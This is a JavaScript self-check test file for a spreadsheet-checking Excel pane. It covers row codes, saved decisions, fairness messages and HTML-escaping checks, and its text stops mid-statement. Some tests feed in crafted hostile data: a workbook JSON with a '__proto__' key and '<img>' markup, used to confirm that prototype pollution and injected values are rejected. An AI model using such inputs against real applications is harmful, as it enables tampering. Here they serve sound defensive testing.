// Pane pure-logic check, no Office/fetch. Run: node frontend/selfcheck.js
import assert from "node:assert";
import { esc, asNumber } from "./utils/text.js";
import { cutNote, r1c1ToA1, tableFromGrid, isDateFormat, excelDate, rowFromAddress, colLetter, cellAt, sameRow, readAs, spots } from "./utils/sheet.js";
import { issuesOf, recommendFix, typoKind, afterFix, unusualColumn } from "./features/fix.js";
import { plainReason, summaryOf, legendOf, flaggedRows, fairnessNote, fairnessTests, listOrder, levelChange, asLastScan, lastScanSaid, doneOf, shareOf } from "./features/scan.js";
import { MEASURED, COLOR, OLD_COLOR } from "./constants/index.js";
import { oddLines, rulesLines } from "./features/ai.js";
import { read as readLimit } from "./pages/limits.js";
import { strengthHint, asStrength, levelAt, levelWord } from "./pages/strength.js";
import { exactFixes, safeUndo } from "./features/autofix.js";
import { readdirSync, readFileSync } from "node:fs";
import { inflateSync } from "node:zlib";
import { hash, rowHash, codes, codeAt, asBook, decide, PER_SHEET, SHEETS } from "./features/decisions.js";
import { WORKBOOK_KEYS } from "./features/forget.js";
import { asHighlights, KEPT } from "./features/highlight.js";
import * as K from "./constants/index.js";
import { remember, forget, recall, clearAll, MAX_KEPT, OFFERED } from "./features/memory.js";
import { measures, copiedTabs, copiedSaid, lastRowSaid } from "./features/tabs.js";
import { tablesFromGrid, sentOf, unreadSaid, formatRows, asSheet, place, local, biggest, rowAt, areaOf } from "./utils/layout.js";
import { findingsAt, inRange, ignored, liveable, liveOn, soundOn, noteSaid, checkedSaid, LIVE_ROWS } from "./features/live.js";
import { asLearned, learnIn, taught, learnedOf, stoppable, KIND_WORDS, ONE_CELL, PER_SHEET as LEARN_CAP, SENT, TEXT } from "./features/learned.js";

// Fixed / Dismissed are kept in the workbook under a code per row, so they outlive the pane (2026-10-20: a dismissed
// row came back flagged after a reload, an accepted fix vanished). Same values = same code, on any PC, every time.
assert.equal(hash("East,5"), hash("East,5"));
assert.notEqual(rowHash(["East", 5]), rowHash(["East", "5"]), "text typed in a number column is another row");
assert.notEqual(rowHash(["East", 5]), rowHash(["East", 6]));
assert.match(hash(""), /^[0-9a-z]{1,11}$/);
// two identical rows are two rows; a sort keeps every code (the k-th copy stays the k-th copy)
const hs = ["a", "b", "a", "c", "a"];
assert.deepEqual(codes(hs), ["a.0", "b.0", "a.1", "c.0", "a.2"]);
assert.deepEqual(codes(["c", "a", "a", "b", "a"]).sort(), codes(hs).sort());
assert.equal(codeAt(hs, 4, "a"), "a.2", "a row just fixed gets the code the next scan will give it");
assert.equal(codeAt(hs, 1, "a"), "a.1");
// the scan's dates are text: a fixed row read back from Excel must be read the same way to keep its code
assert.deepEqual(readAs([46028, 46028, "x"], [true, false, false]), ["2026-01-06", 46028, "x"]);
assert.deepEqual(tableFromGrid([["When", "N"], [46028, 1]], [["General", "General"], ["m/d/yyyy", "General"]], 0, 0).dates, [true, false]);
// AH-150: a column holds dates when most of its first non-empty cells wear a date format, never by row 2 alone: a sort
// that put a blank or a text there sent the whole column as serial numbers, and one date-formatted cell made a count dates
assert.deepEqual(tableFromGrid([["When", "N"], ["", 5], ["unknown", 6], [46028, 7], [46029, 8], [46030, 9]],
  [["General", "General"], ["General", "m/d/yyyy"], ["General", "0"], ["m/d/yyyy", "0"], ["m/d/yyyy", "0"], ["m/d/yyyy", "0"]], 0, 0).dates, [true, false]);
// a crafted workbook can put anything under the key: only codes and our two words survive, and "__proto__" is a sheet
const tampered = JSON.parse('{"__proto__": {"a1.0": "fixed"}, "S": {"a1.0": "dismissed", "b.0": "admin", "<img>": "fixed", "c.12": "fixed"}, "T": [1], "U": "x"}');
const book = asBook(tampered);
assert.deepEqual(Object.keys(book), ["__proto__", "S"]);
assert.deepEqual({ ...book.S }, { "a1.0": "dismissed", "c.12": "fixed" });
assert.equal(({}).polluted, undefined);
for (const junk of [null, "x", 5, [], [["S", {}]]]) assert.deepEqual(Object.keys(asBook(junk)), []);
// decide: set, replace (Accept after Dismiss), remove (Undo); newest last; capped per sheet and in sheets
let b = decide(asBook(null), "S", [["a.0", "dismissed"]]);
b = decide(b, "S", [["b.0", "fixed"]]);
b = decide(b, "S", [["a.0", null], ["a2.0", "fixed"]]);
assert.deepEqual({ ...b.S }, { "b.0": "fixed", "a2.0": "fixed" });
b = decide(b, "S", [["a2.0", null], ["a.0", "dismissed"]]);
assert.deepEqual({ ...b.S }, { "b.0": "fixed", "a.0": "dismissed" }, "Undo removes the fix and brings back the Dismiss");
b = decide(b, "S", [["b.0", null], ["a.0", null]]);
assert.deepEqual(Object.keys(b), [], "a sheet with no decisions left is dropped");
let many = decide(asBook(null), "S", Array.from({ length: PER_SHEET + 1 }, (_, k) => [`r${k}.0`, "fixed"]));
assert.equal(Object.keys(many.S).length, PER_SHEET);
assert.ok(!("r0.0" in many.S) && `r${PER_SHEET}.0` in many.S, "the oldest decision goes first");
for (let k = 0; k <= SHEETS; k++) many = decide(many, `Sheet${k}`, [["a.0", "dismissed"]]);
assert.equal(Object.keys(many).length, SHEETS);
assert.ok(!("S" in many), "the sheet decided on longest ago goes first");
// the list: flagged worst first, then rows fixed or dismissed before that are no longer flagged, in sheet order
assert.deepEqual(listOrder([{ severity: null }, { severity: "Low", magnitude: 1 }, { severity: null }, { severity: "High", magnitude: 0 }, { severity: "Noted" }],
  { 4: "fixed", 0: "dismissed", 1: "dismissed" }), [3, 1, 0, 4]);

// Ask AI's memory (AH-143): kept on this PC, newest first, only the flagged column's, Undo and Forget take it back out
{
  const box = new Map();
  globalThis.localStorage = { getItem: (k) => box.get(k) ?? null, setItem: (k, v) => box.set(k, String(v)), removeItem: (k) => box.delete(k) };
  for (let k = 0; k < 25; k++) remember("Units", "Units weird limit is 90; this is 500 (likely 50)", 500 + k, 50);
  remember("Region", 'Region "east " looks like "East"', "east ", "East");
  assert.equal(recall(" units ").length, OFFERED, "a header matches case and space blind, and only 20 go to the engine");
  assert.deepEqual(recall("Units")[0], { h: "Units", k: "Units weird limit is 90; this is 500 (likely 50)", o: "524", n: "50" }, "newest first");
  assert.deepEqual(recall("Region"), [{ h: "Region", k: 'Region "east " looks like "East"', o: "east", n: "East" }]);
  assert.deepEqual(recall("Price"), [], "no fix of this column: nothing");
  forget("Units", 524, 50);
  assert.equal(recall("Units")[0].o, "523", "Undo takes its own fix back out");
  remember("x".repeat(99), "y".repeat(999), "z".repeat(999), "\n".repeat(9) + "w".repeat(999));
  assert.ok(Object.values(recall("x".repeat(99))[0]).every((v) => v.length <= 60), "a long value is cut to what the engine takes");
  for (let k = 0; k < MAX_KEPT + 5; k++) remember("Units", "fix", k, k);
  assert.equal(JSON.parse(box.get(K.MEMORY_KEY)).length, MAX_KEPT, "at most 200 kept, the oldest go first");
  box.set(K.MEMORY_KEY, '[{"h": "Units", "k": "<img>", "o": 1}, "x", null, {"h":"Units","k":"fix","o":"1","n":"2","x":"3"}]');
  assert.deepEqual(recall("Units"), [{ h: "Units", k: "fix", o: "1", n: "2" }], "only whole entries survive what another page wrote, and only their fields");
  clearAll();
  assert.ok(!box.has(K.MEMORY_KEY) && recall("Units").length === 0, "Forget what the AI learned forgets all of it");
  globalThis.localStorage = { getItem() { throw new Error("off"); }, setItem() { throw new Error("off"); }, removeItem() { throw new Error("off"); } };
  remember("Units", "fix", 1, 2); clearAll(); assert.deepEqual(recall("Units"), [], "no storage: nothing kept, nothing thrown");
  delete globalThis.localStorage;
}

// A DOM0 handler that returns false cancels its event: `$("fix-intent").onkeydown = (e) => e.key === "Enter" && e.ctrlKey
// && askFix()` returned false for every key but Ctrl+Enter, so no character ever reached the Ask AI box (2026-10-20).
// Key, pointer and input handlers go through addEventListener with an explicit preventDefault, and no other DOM0
// handler may be a bare `a && b()` / `a || b()` whose value can be false.
const panes = readdirSync(new URL(".", import.meta.url), { recursive: true }).filter((f) => f.endsWith(".js") && f !== "selfcheck.js");
for (const f of panes) {
  const src = readFileSync(new URL(f, import.meta.url), "utf8");
  const cancels = /\.on(?:key|pointer|mouse|touch|wheel|input|beforeinput|submit|contextmenu|drag|drop|paste|cut|copy)[a-z]*\s*=(?!=)/.exec(src);
  assert.ok(!cancels, `${f}: "${cancels?.[0]}" - use addEventListener and call preventDefault yourself`);
  const falsy = /\.on[a-z]+\s*=\s*(?:async\s*)?(?:\([^)]*\)|\w+)\s*=>\s*(?!\{)[^\n;]*(?:&&|\|\|)/.exec(src);
  assert.ok(!falsy, `${f}: "${falsy?.[0]}" can return false, which cancels the event - give it a { body }`);
  // Excel refuses Excel.run while the user is typing in a cell: one left unawaited, unreturned and uncaught was an
  // unhandled rejection when the pane opened mid-edit (AH-58)
  for (const m of src.matchAll(/(\b(?:await|return)\s+)?Excel\.run\(/g)) {
    if (m[1]) continue;
    let depth = 0, k = m.index + m[0].length - 1;
    do depth += { "(": 1, ")": -1 }[src[k]] || 0; while (depth && ++k < src.length);
    assert.match(src.slice(k + 1), /^\s*\.catch\(/, `${f}: an Excel.run that is not awaited, returned or caught (line ${src.slice(0, m.index).split("\n").length})`);
  }
}

// every value written into HTML goes through esc() (a number through asNumber()), not only the ones that look like they
// come from the sheet: a row's "done" word and its severity were the last two left bare (AH-87 audit)
for (const f of panes) {
  const src = readFileSync(new URL(f, import.meta.url), "utf8");
  if (!/\.innerHTML\s*=/.test(src)) continue;
  for (const [tpl] of src.matchAll(/`[^`]*`/g)) {
    if (!tpl.includes("<")) continue; // not markup
    for (const [, v] of tpl.matchAll(/\$\{([^}]*)\}/g)) assert.match(v, /^\s*(?:esc|asNumber)\(/, `${f}: \${${v}} reaches innerHTML without esc()`);
  }
}

// every inline <svg> is either a picture with a name (role="img" and a label) or hidden from screen readers
// (aria-hidden="true", focusable="false" for old Edge): unnamed, a screen reader reads out "image" or its path data (AH-87)
for (const dir of ["./", "../site/"]) {
  for (const f of readdirSync(new URL(dir, import.meta.url)).filter((f) => f.endsWith(".html"))) {
    const src = readFileSync(new URL(dir + f, import.meta.url), "utf8");
    for (const [tag] of src.matchAll(/<svg\b[^>]*>/g)) {
      const hidden = /\saria-hidden="true"/.test(tag), named = /\srole="img"/.test(tag) && /\saria-label(?:ledby)?="[^"]+"/.test(tag);
      assert.ok(hidden || named, `${dir}${f}: ${tag.slice(0, 80)} is neither aria-hidden="true" nor role="img" with a label`);
    }
  }
}

// the font ships in the pane (and so in the exe, which bundles frontend/ whole): the SIL Open Font License asks that its
// text go with it (AH-87: only the website's copy had it)
for (const font of readdirSync(new URL("assets/", import.meta.url)).filter((f) => f.endsWith(".woff2")))
  assert.ok(font === "plus-jakarta-sans.woff2" && readFileSync(new URL("assets/OFL-PlusJakartaSans.txt", import.meta.url), "utf8").includes("SIL Open Font License, Version 1.1"),
    `assets/${font} ships without its licence text`);

// "Forget what this workbook saved" forgets every key the pane saves in a workbook: a key added later and left off its
// list would stay in people's files after they asked for it to go (AH-87)
{
  const saved = new Set();
  for (const f of panes) {
    const src = readFileSync(new URL(f, import.meta.url), "utf8");
    for (const [, k] of src.matchAll(/settings(?:\(\))?\.set\(\s*([^,]+?)\s*,/g)) saved.add(/^["']/.test(k) ? k.slice(1, -1) : K[k]);
  }
  assert.deepEqual([...saved].sort(), WORKBOOK_KEYS.map(([k]) => k).sort(), "the keys the pane saves in a workbook and the ones Forget removes differ");
}

// fairness line: protected columns named; a real gap spelled out; nothing at all without a protected column. In plain
// words since AH-149 ("protected", "outcomes" and "even across their groups" lost a reader with no statistics)
const FAIR = "To be fair to people, Arcas never uses ";
assert.equal(fairnessNote({ protected: {}, tests: [] }), "");
assert.equal(fairnessNote(undefined), "");
// with no gap, the line names only the checks that ran (AH-17: "Flags, blanks and outcomes are even" on a sheet that ran
// one flag-rate check), says which ones too few rows could prove, and never calls an empty report even
const even = (measure) => ({ verdict: "even", text: "x", measure });
assert.equal(fairnessNote({ protected: { Age: "demographic", Location: "location" }, tests: [even("flag"), even("missing"), even("outcome")] }),
  `${FAIR}Age or Location to pick which rows look wrong. Flagged rows, blank cells and yes/no answers come out about the same in each group.`);
assert.equal(fairnessNote({ protected: { Region: "location" }, tests: [even("flag"), even("flag")] }),
  `${FAIR}Region to pick which rows look wrong. Flagged rows come out about the same in each group.`);
assert.equal(fairnessNote({ protected: { Sex: "demographic" }, tests: [even("outcome"), { verdict: "unclear", measure: "flag",
  text: "Sex: rows flagged differs across groups (1% to 9%), but there are not enough rows to tell whether that is a real gap" }] }),
  `${FAIR}Sex to pick which rows look wrong. Yes/no answers come out about the same in each group. Not enough rows to tell: ` +
  "Sex: rows flagged differs across groups (1% to 9%), but there are not enough rows to tell whether that is a real gap.");
assert.equal(fairnessNote({ protected: { Sex: "demographic" }, tests: [] }),
  `${FAIR}Sex to pick which rows look wrong. Nothing to compare: no group of 20 rows or more has flagged rows, blank cells or yes/no answers.`);
assert.equal(fairnessNote({ protected: { Location: "location" }, tests: [{ verdict: "gap", text: "Location Phoenix: 60% blank Income vs 3% for Chicago - a real gap, check why" }] }),
  `${FAIR}Location to pick which rows look wrong. Groups that differ: Location Phoenix: 60% blank Income vs 3% for Chicago - a real gap, check why.`);
// a gap the engine has measured public context for: the gap first, then its context sentence, once per sentence
const ctx = "For comparison, in public US census data 30.4% of men and 10.9% of women earn over 50K.";
assert.equal(fairnessNote({ protected: { sex: "demographic" }, tests: [
  { verdict: "gap", text: "sex Male: 30% income >50K vs 11% for Female - a real gap, check why", context: ctx, groups: { a: [9, 0.3], b: [9, 0.1] } },
  { verdict: "gap", text: "sex Female: 8% missing occupation vs 5% for Male - a real gap, check why", context: ctx, groups: { a: [9, 0.08], b: [9, 0.05] } },
  { verdict: "even", text: "x", context: "never shown for an even test" }] }),
  `${FAIR}sex to pick which rows look wrong. Groups that differ: sex Male: 30% income >50K vs 11% for Female - a real gap, check why; ` +
  `sex Female: 8% missing occupation vs 5% for Male - a real gap, check why. ${ctx}`);
// many gaps (census: 15): the 3 widest in the line, the rest in the list; the list puts gaps first, widest first
const gap = (w, text) => ({ verdict: "gap", text, groups: { a: [50, 0.5 + w], b: [50, 0.5] } });
const census = { protected: { sex: "demographic" }, tests: [{ verdict: "even", text: "e", groups: { a: [9, 0.9], b: [9, 0] } }, gap(0.1, "g1"), gap(0.4, "g4"), gap(0.2, "g2"), gap(0.3, "g3")] };
assert.equal(fairnessNote(census), `${FAIR}sex to pick which rows look wrong. Groups that differ: g4; g3; g2, and 1 more under "All fairness checks".`);
assert.deepEqual(fairnessTests(census).map((t) => t.text), ["g4", "g3", "g2", "g1", "e"]);
assert.deepEqual(fairnessTests(undefined), []);

// summary: "Noted" (inside the usual range) is fine, not a problem
assert.equal(summaryOf([{ severity: null }, { severity: "Noted" }, { severity: null }]), "No problems found in 3 rows.");
assert.equal(summaryOf([{ severity: "High" }, { severity: "Low" }, ...Array(1998).fill({ severity: null })]), "1 of 2,000 rows look wrong. 1 more is worth a quick check.");
assert.equal(summaryOf([{ severity: "Low" }, { severity: "Low" }]), "Nothing clearly wrong in 2 rows. 2 are worth a quick check.");
// AH-170: a sheet of one row is said in the singular ("No problems found in 1 rows." was said), as lastScanSaid does
assert.equal(summaryOf([{ severity: null }]), "No problems found in 1 row.");
assert.equal(summaryOf([{ severity: "Medium" }]), "1 of 1 row looks wrong.");
assert.equal(summaryOf([{ severity: "Low" }]), "Nothing clearly wrong in 1 row. 1 is worth a quick check.");
assert.equal(summaryOf([{ severity: "High" }, { severity: null }]), "1 of 2 rows look wrong.");
// AH-170: Check words says each odd word once, in its column, with how many rows and the first few: one word in 100
// cells gave 100 identical lines (the pane 9,700 px tall at 320 px). At most CAP (50) lines, then one line for the rest
{
  const odd = [5, 2, 95].map((row) => ({ row, col: 1, value: "Paris", why: "a city" })).concat([{ row: 7, col: 1, value: "Lyon", why: "<b>a city</b>" }]);
  assert.deepEqual(oddLines(odd, ["When", "Region"], 0, 0), ['Column B (Region): "Paris" in 3 rows (4, 7 and 97). The AI says: a city', 'Row 9, column B (Region): "Lyon". The AI says: <b>a city</b>']);
  const many = Array.from({ length: 100 }, (_, k) => ({ row: 99 - k, col: 0, value: "Central", why: "x" }));
  assert.equal(oddLines(many, [""], 4, 2)[0], 'Column C: "Central" in 100 rows (6, 7, 8 and 97 more). The AI says: x', "rows in sheet order, a blank header left out");
  const words = Array.from({ length: 60 }, (_, k) => ({ row: k, col: 0, value: `w${k}`, why: "x" }));
  const lines = oddLines(words, ["Item"], 0, 0);
  assert.equal(lines.length, K.CAP + 1);
  assert.equal(lines.at(-1), "+ 10 more words the AI found out of place.");
  assert.equal(oddLines(Array.from({ length: K.CAP }, (_, k) => ({ row: k, col: 0, value: `w${k}`, why: "x" })), ["Item"], 0, 0).length, K.CAP, "exactly CAP lines need no more line");
}
// AH-202: Check subject rules says each rule once (true on all rows, on most with the rows against it after it, did not
// hold, too few rows) with the AI's why, each row by its sheet row and its cells' letters and the sheet's own headers
{
  const r = (said, held, total, holds, why = "x") => ({ said, held, total, holds, why });
  const out = { sent: 3, headers: 4, rules: [r("Net = Debit − Credit", 29, 30, true, "<b>double entry</b>"), r("A is at most B", 30, 30, true),
    r("C = A × B", 20, 30, false), r("D is 0 where E is after F", 6, 6, false)],
  rows: [{ row: 7, cells: [3], reason: "Net 5 is not Debit − Credit (4): …", rule: 0 }, { row: 9, cells: [1, 0], reason: "B …", rule: 0 }] };
  assert.deepEqual(rulesLines(out, ["Debit", "Units", "Units", "Net"], 2, 1), [
    "Only the first 3 of 4 column headers were sent.",
    "True on 29 of 30 rows: Net = Debit − Credit. The AI says: <b>double entry</b>",
    "Row 11, column E (Net): Net 5 is not Debit − Credit (4): …",
    "Row 13, columns C (Units) and B (Debit): B …",
    "True on all 30 rows: A is at most B. The AI says: x",
    "Did not hold, so nothing was flagged: C = A × B (true on 20 of 30 rows). The AI says: x",
    "Too few rows to check: D is 0 where E is after F (6 rows). The AI says: x"]);
  assert.deepEqual(rulesLines({ sent: 0, headers: 0, rules: [], rows: [] }, ["A"], 0, 0), ["The AI found no rules to check in your headers."]);
  const many = { sent: 1, headers: 1, rules: [r("A = B + C", 900, 1000, true)], rows: Array.from({ length: 60 }, (_, k) => ({ row: k, cells: [0], reason: "x", rule: 0 })) };
  const lines = rulesLines(many, ["A"], 0, 0);
  assert.equal(lines.length, K.CAP + 1);
  assert.equal(lines.at(-1), "+ 11 more lines.");
  assert.equal(rulesLines({ ...many, rows: many.rows.slice(0, K.CAP - 1) }, ["A"], 0, 0).length, K.CAP, "exactly CAP lines need no more line");
}
// AH-170: a limit box's text: empty is no limit, a number is the limit, anything else is refused (a number box dropped
// letters and read empty, so the limit was taken off without a word)
assert.deepEqual(["", "  ", " -10 ", "1e3", "0.5", "abc", "12abc", "1,000", "-"].map((value) => readLimit({ value })), [null, null, -10, 1000, 0.5, NaN, NaN, NaN, NaN]);
// AH-166: the legend only when the list holds 2+ severities: one severity alone repeated the summary ("5 of 300 rows look
// wrong." over "Probably wrong: 5"). Worst first, each with its count
assert.deepEqual(legendOf([{ severity: "Medium" }, { severity: "Medium" }, { severity: null }]), []);
assert.deepEqual(legendOf([{ severity: "Low" }, { severity: "High" }, { severity: "Low" }, { severity: "Noted" }]), [["High", 1], ["Low", 2]]);
assert.deepEqual(legendOf([]), []);
// AH-171: a finish line under the card after each decision, counting the list's rows (the same rows "Rows to check (1 of 5
// done)" counts): silent before the first, and again once an Undo takes the last one back; a row decided but not listed
// is not counted
assert.equal(doneOf([3, 1, 0, 4, 2], {}), "");
assert.equal(doneOf([3, 1, 0, 4, 2], { 1: "fixed" }), "1 of 5 rows done.");
assert.equal(doneOf([3, 1, 0, 4, 2], { 1: "fixed", 4: "dismissed", 9: "fixed" }), "2 of 5 rows done.");
assert.equal(doneOf([3, 1, 0, 4, 2], { 0: "fixed", 1: "fixed", 2: "dismissed", 3: "fixed", 4: "dismissed" }), "All 5 rows done.");
assert.equal(doneOf([7], { 7: "dismissed" }), "1 of 1 row done.");
{ const decided = { 1: "fixed", 4: "dismissed" }; delete decided[1]; assert.equal(doneOf([3, 1, 0, 4, 2], decided), "1 of 5 rows done.", "after an Undo"); delete decided[4]; assert.equal(doneOf([3, 1, 0, 4, 2], decided), ""); }
// AH-184: the finish line drawn as well as said: the share of the same rows, as wide as the gold line over the foot bar
assert.equal(shareOf([3, 1, 0, 4, 2], {}), 0);
assert.equal(shareOf([3, 1, 0, 4, 2], { 1: "fixed", 4: "dismissed", 9: "fixed" }), 0.4);
assert.equal(shareOf([7], { 7: "dismissed" }), 1);
assert.equal(shareOf([], {}), 0, "an empty list draws no line");
// AH-157: a reopened workbook says its last check at once, from numbers only (never a value or a reason). A crafted
// workbook can carry anything under the key: only a sheet name and whole numbers survive
{
  const at = Date.UTC(2026, 10, 9, 12), now = Date.UTC(2026, 10, 10, 12);
  const rec = { sheet: "Sales", at, level: 5, rows: 300, high: 2, medium: 10, low: 4 };
  assert.deepEqual(asLastScan({ ...rec, cells: ["x"], reason: "y" }), rec, "only the numbers are kept");
  for (const junk of [null, "x", 5, [], { ...rec, rows: -1 }, { ...rec, high: 1.5 }, { ...rec, sheet: 7 }, { ...rec, at: "today" }, { ...rec, level: "5" }])
    assert.equal(asLastScan(junk), null, JSON.stringify(junk));
  assert.equal(asLastScan({ ...rec, sheet: "x".repeat(99) }).sheet.length, 31);
  assert.equal(lastScanSaid(rec, now), "Last check on Sales, 9 Nov: 12 of 300 rows looked wrong and 4 more were worth a quick check.");
  assert.equal(lastScanSaid({ ...rec, high: 0, medium: 1, low: 0 }, now), "Last check on Sales, 9 Nov: 1 of 300 rows looked wrong.");
  assert.equal(lastScanSaid({ ...rec, high: 0, medium: 0, low: 1 }, now), "Last check on Sales, 9 Nov: 1 of 300 rows was worth a quick check.");
  assert.equal(lastScanSaid({ ...rec, rows: 1, high: 0, medium: 0, low: 0 }, Date.UTC(2027, 0, 2)), "Last check on Sales, 9 Nov 2026: no problems found in 1 row.");
  assert.equal(lastScanSaid(null), "");
}
assert.deepEqual(flaggedRows([{ severity: "Low", magnitude: 99 }, { severity: "Medium", magnitude: 1 }, { severity: "High", magnitude: 0 }]).map((r) => r.i), [2, 1, 0], "surest first, not biggest");

assert.equal(excelDate(45658), "2025-01-01");
assert.equal(excelDate(46028), "2026-01-06"); // first OrderDate of the Contextures practice sheet
assert.equal(excelDate(45658.5), "2025-01-01 12:00:00"); // a time of day is kept: two trips on one day are not duplicates
for (const f of ["m/d/yyyy", "yyyy-mm-dd", "[$-409]mmmm d, yyyy", "d-mmm"]) assert.ok(isDateFormat(f), f);
for (const f of ["General", "0.00", "$#,##0.00", "[Red]0.00", '0 "days"']) assert.ok(!isDateFormat(f), f);

// clicked cell -> data row (header in sheet row 1 -> startRow 0; first data row is sheet row 2 = index 0)
assert.equal(rowFromAddress("C2", 0), 0);
assert.equal(rowFromAddress("B7:D7", 0), 5, "several cells of one row");
assert.equal(rowFromAddress("C3:C40", 0), null, "dragging down a column is not a row click");
assert.equal(rowFromAddress("'My Sheet'!$C$7", 0), 5);
assert.equal(rowFromAddress("7:7", 0), 5, "whole row selected");
assert.equal(rowFromAddress("C8", 3), 3, "data starting lower down");
assert.equal(rowFromAddress("C1", 0), null, "header row");
assert.equal(rowFromAddress("B:B", 0), null, "whole column");

assert.deepEqual([0, 25, 26, 27, 701, 702].map(colLetter), ["A", "Z", "AA", "AB", "ZZ", "AAA"]);
for (const n of [0, 25, 26, 701, 702]) assert.deepEqual(cellAt(colLetter(n) + "12"), { col: n, row: 12 }, "cellAt undoes colLetter");
assert.equal(cellAt("=A1"), null);

// the row Excel holds now vs the row the scan read: a date comes back as a serial, floats may wobble; any edit fails
assert.ok(sameRow([46028, "East", 40, 0.1 + 0.2], ["2026-01-06", "East", 40, 0.3]));
assert.ok(!sameRow([46028, "East", 41, 0.3], ["2026-01-06", "East", 40, 0.3]), "an edited cell");
assert.ok(!sameRow([46029, "East", 40, 0.3], ["2026-01-06", "East", 40, 0.3]), "a different row slid in (sorted / inserted)");
// the row an auto-fix leaves: the scanned row with the fixed cell typed in (sheet row 5, table from column B)
assert.deepEqual(afterFix(["x", "east ", 5], [{ cell: "C5", new: "East" }, { cell: "C6", new: "No" }], 1, 5), ["x", "East", 5]);
// the column an "only unusual" reason points at
const uc = ["Units", "Unit Cost", "Total"];
assert.equal(unusualColumn("Flagged by 1 of 3: Unusual combination of values, mainly Unit Cost", uc), "Unit Cost");
assert.equal(unusualColumn("Flagged by 2 of 3: Units is unusual relative to its local trend near 2026-06-25", uc), "Units");
assert.equal(unusualColumn("Flagged by 1 of 3: Total jumped sharply near 2026-06-25", uc), "Total");
assert.equal(unusualColumn("Duplicate of row 2", uc), null);

// the slider: every level has words; a missing or broken saved value is 5
assert.ok([...Array(11).keys()].every((s) => strengthHint(s).length > 10));
assert.ok(strengthHint(0).startsWith("Basics") && strengthHint(5).startsWith("Recommended") && strengthHint(10).startsWith("Strictest"));
// each level's hint ends with what that very level did on the bench (MEASURED; backend/tests/test_strength_promise.py
// re-measures it), so 5 and 10 never read the same (AH-15)
for (let s = 0; s <= 10; s++) {
  const [found, , fineLow] = MEASURED.levels[s], hint = strengthHint(s);
  assert.ok(hint.includes(`We tested it on ${MEASURED.sheets} practice sheets with ${MEASURED.planted} mistakes hidden in them. It found ${found === MEASURED.planted ? `all ${MEASURED.planted}` : `${found} of them`}`), hint);
  assert.ok(fineLow ? hint.includes(`It also listed ${fineLow.toLocaleString("en-US")} of the 2,724 rows that were fine`) : hint.includes("It listed none of the 2,724 rows that were fine"), hint);
}
assert.notEqual(strengthHint(5), strengthHint(10));
// AH-149: a screen reader hears the level's word beside its number, the scale's three words at their places
assert.deepEqual([0, 3, 5, 7, 10].map(levelWord), ["Basics", "Lighter", "Recommended", "Stricter", "Strictest"]);
// every level opens with its own words: 2, 4, 6, 8 and 10 used to repeat the level below, so 6 opened "Recommended." though
// 5 is the recommended level (Council B, AH-15 review; AH-20)
{
  const opening = (s) => strengthHint(s).split(/[.:]/)[0];
  assert.equal(new Set([...Array(11).keys()].map(opening)).size, 11, [...Array(11).keys()].map(opening).join(" | "));
  assert.deepEqual([...Array(11).keys()].filter((s) => strengthHint(s).startsWith("Recommended")), [5]);
  assert.deepEqual([...Array(11).keys()].filter((s) => strengthHint(s).startsWith("Strictest")), [10]);
}
// what a new level changed, counted from the two scans' own rows (AH-15)
const sev = (...s) => s.map((x) => ({ severity: x, magnitude: 1 })), H = ["a", "b", "c", "d", "e"];
const at = (level, rows, hashes = H, sheet = "Sales") => ({ level, rows, hashes, sheet });
assert.equal(levelChange(at(5, sev("Medium", null, null, null, "Low")), at(10, sev("Medium", "Low", "Low", null, "Low"))),
  "Slider moved from 5 to 10: 2 more rows worth a check (values close to the edge of usual); the rows that look wrong are the same.");
assert.equal(levelChange(at(10, sev("Medium", "Low", "Low", null, "Low")), at(5, sev("Medium", null, null, null, "Low"))),
  "Slider moved from 10 to 5: 2 fewer rows worth a check; the rows that look wrong are the same.");
assert.equal(levelChange(at(5, sev("Medium", null, "Low", null, null)), at(9, sev("Medium", "Medium", null, null, null))),
  "Slider moved from 5 to 9: 1 fewer row worth a check; 1 more row looks wrong.");
assert.equal(levelChange(at(5, sev(null, "Low", null, null, null)), at(6, sev(null, null, "Low", null, null))),
  "Slider moved from 5 to 6: 1 other row worth a check; the rows that look wrong are the same.");
assert.equal(levelChange(at(5, sev("High", null, null, null, "Low")), at(7, sev("High", null, null, null, "Low"))),
  "Slider moved from 5 to 7: the same rows as at 5. Nothing on this sheet falls between the two levels.");
// nothing is said when the counts could mean something else: the same level, another sheet, an edited sheet, no scan before
assert.equal(levelChange(at(5, sev("Medium")), at(5, sev(null))), "");
assert.equal(levelChange(at(5, sev(null, "Low", null, null, null)), at(10, sev(null, "Low", "Low", null, null), H, "Costs")), "");
assert.equal(levelChange(at(5, sev(null, "Low", null, null, null)), at(10, sev(null, "Low", "Low", null, null), ["a", "b", "x", "d", "e"])), "");
assert.equal(levelChange(null, at(10, sev("Low"))), "");
// 50+ rows look wrong: the list's first 50 are the same, and the line says where the new rows went
{
  const many = Array.from({ length: 60 }, () => ({ severity: "Medium", magnitude: 1 })), hs = many.map((_, i) => `h${i}`);
  const more = [...many, { severity: null, magnitude: 0 }, { severity: null, magnitude: 0 }], hs2 = [...hs, "x", "y"];
  const after = [...many, { severity: "Low", magnitude: 3 }, { severity: "Low", magnitude: 2 }];
  assert.equal(levelChange(at(5, more, hs2), at(10, after, hs2)), "Slider moved from 5 to 10: 2 more rows worth a check (values close to the edge of usual); " +
    'the rows that look wrong are the same. The list shows the 50 surest rows first, so the new ones are in the "+ more" line at its end. Your sheet colours them all.');
}
assert.deepEqual([0, 10, 7, undefined, null, "3", 11, -1, 2.5].map(asStrength), [0, 10, 7, 5, 5, 5, 5, 5, 5]);
// pointer anywhere on (or past) a 200px track starting at x=100 -> the nearest level
assert.deepEqual([100, 110, 109, 200, 300, 0, 999, 141].map((x) => levelAt(x, 100, 200)), [0, 1, 0, 5, 10, 0, 10, 2]);
// AH-16: a number the engine did not offer is never guessed. A "maybe 1 with an extra 0" for a 10 among 1-5 answers was
// dropped (John, 2026-10-22): real counts (household size, nights stayed) were offered a tenth
{
  const sc = recommendFix(["Who", "Q3"], [["a", 4], ["b", 10], ["c", 2]], 1, { Q3: [1, 5, 0, 9] },
    "Q3 baseline limit is 9; this is 10", 0, 0, {}, null, { Q3: 1 });
  assert.deepEqual(sc.changes, [], "a number in maybe is never written unless the engine's own limit sentence offers it");
  assert.ok(!sc.guess, sc.explanation);
  // AH-21: a value too small for its column may have lost a 0 or be real (DC's 4% among 30-70%): offered as the engine
  // says it, "(maybe 0.4)", a Best guess card labelled a guess, never "likely" and never auto-applied
  const wg = recommendFix(["State", "Share"], [["a", 0.5], ["b", 0.04]], 1, { Share: [0.3, 0.7, 0.2, 0.8] },
